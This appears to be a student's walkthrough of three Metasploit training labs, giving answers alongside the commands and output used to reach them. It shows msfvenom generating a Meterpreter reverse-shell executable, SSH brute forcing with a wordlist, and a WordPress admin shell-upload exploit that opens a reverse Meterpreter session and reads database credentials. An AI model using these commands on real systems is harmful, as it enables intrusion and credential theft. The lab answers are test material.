## Lab 1:
**Q:** Which option would you give to -p if you wanted to create a Windows x64 stageless reverse shell TCP payload?

**A:** windows/x64/shell_reverse_tcp

**Q:** If you wanted to make sure your generated payload did not contain any null bytes, what option would you provide?

**A:** -b '\x00'

**Q:** Which encoder (Name) will use a single-byte XOR countdown encoder? 

**A:** x86/countdown

**Q:** Which of the following would correctly generate a reverse Meterpreter shell?

**A:** msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=172.21.1.1 lport=443 -f exe -o shell.exe

**Q:** Using the correct payload from the question above, generate this payload. What is the final payload size?

**A:** 7168 bytes



## Lab 2:
Tasks

>1. Start the PostgreSQL service and start the Metasploit console
>2. Initialise and connect to the msf database
>3. Import the scan data from /root/ScanData/*
>4. Search the database to answer the questions

Pre question commands:

>">postgresql start"

>">Msfconsole"

>inside Metasploit console

>">Msfdb init"

>already connected skipping

>">Db_status"


>connected to msf

>">Db_import /root/ScanData/*

>imports lots of data


**Q:** How many hosts are recorded in the database?

>">hosts"

>shows a list of hosts there are 10

**A:** 10

**Q:** How many hosts are running the HTTP service? 

>">services"

>shows all services. Counted 5. There is probably a better way to do this with grep, but database is small so this command works.

**A:** 5

**Q:** Which host appears to be the DNS server? (Provide the IP address.)

**A:** 172.17.0.9

**Q:** What is Jimmy’s FTP password?

>"> creds"

>clearly gives jimmys password

**A:** batman

**Q:** Is there any loot? 

>">loot"

>i see nothing here so i think no

**A:** No


## Lab 3:

pre lab commands

>"> cd /usr/share/metasploit-framework/modules/auxiliary/"

**Q:** Browse through the auxiliary modules directory in Kali. How many different protocols can you fuzz with Metasploit? (Look in the fuzzer directory.) 

>"> cd fuzzers/"

>i see 8 directories with different protocol names

**A:** 8

**Q:** What is the name of the only scanner module for nfs? 

**A:** nfsmount

**Q:** Use the dir_scanner module to discover potentially interesting directories on the target web server. What is the token from the last directory found by Metasploit? 

>">msfconsole"

https://www.offensive-security.com/metasploit-unleashed/scanner-http-auxiliary-modules/

>">use auxiliary/scanner/http/dir_scanner"

>ip was given in “network” tab

>">set RHOSTS 10.102.3.0"

>">run"

[*] Detecting error code

[*] Using code '404' as not found for 10.102.3.0
[+] Found http://10.102.3.0:80/Joomla/ 200 (10.102.3.0)

[+] Found http://10.102.3.0:80/SiteEdit/ 200 (10.102.3.0)


[+] Found http://10.102.3.0:80/WebBank/ 200 (10.102.3.0)

[+] Found http://10.102.3.0:80/jscss/ 200 (10.102.3.0)

[+] Found http://10.102.3.0:80/leet/ 200 (10.102.3.0)

[*] Scanned 1 of 1 hosts (100% complete)

[*] Auxiliary module execution completed

>copy the http addres of the last “found”. Paste it into firefox and it gives you a webpage with the token

**A:** a7420625e2ba860b0736c0be5a214adf

**Q:** Use the ssh_login module to brute force the SSH service for the target server. Use the root_userpass.txt wordlist. What is the password found? 

https://www.offensive-security.com/metasploit-unleashed/scanner-ssh-auxiliary-modules/

>">use auxiliary/scanner/ssh/ssh_login"

>">set RHOSTS 10.102.3.0"

>">set USERPASS_FILE /usr/share/metasploit-framework/data/wordlists/root_userpass.txt"

>">set VERBOSE false"

>">run"

**A:** rootpass

**Q:** What does RHOST stand for?

**A:** Remote Host

**Q:** What will the command 'show payloads' output?

**A:** Display all available payloads for the chosen exploit

**Q:** Which of the following commands will execute an exploit on Metasploit? 

**A:** Run

**Q:** Which exploit do you need to use for this lab?

**A:** wp_admin_shell_upload

**Q:** What is the value of DB_PASSWORD in /var/www/html/wp-config.php?

>"> msfconsole"

>"> use /unix/webapp/wp_admin_shell_upload"

>"> set httpclienttimeout 60"

>"> set username admin"

>"> set password admin"

>"> set RHOST 10.102.1.17"

>"> run"


[*] Started reverse TCP handler on 10.102.1.193:4444

[*] Authenticating with WordPress using admin:admin...

[+] Authenticated with WordPress

[*] Preparing payload...

[*] Uploading payload...

[*] Executing the payload at /wp-content/plugins/WOglOyuZyo/BqsAVuGOgS.php...

[*] Sending stage (38288 bytes) to 10.102.1.17

[*] Meterpreter session 1 opened (10.102.1.193:4444 -> 10.102.1.17:60216) at 2020-07-04 03:17:45 +0000

[+] Deleted BqsAVuGOgS.php

[+] Deleted WOglOyuZyo.php

[+] Deleted ../WOglOyuZyo


>"> cd .."

>"> cd /var/"

>"> cd www/html"

>"> cat wp-config.php"

> after some reading you can see that DB_password is sqlpassword

**A:** sqlpassword
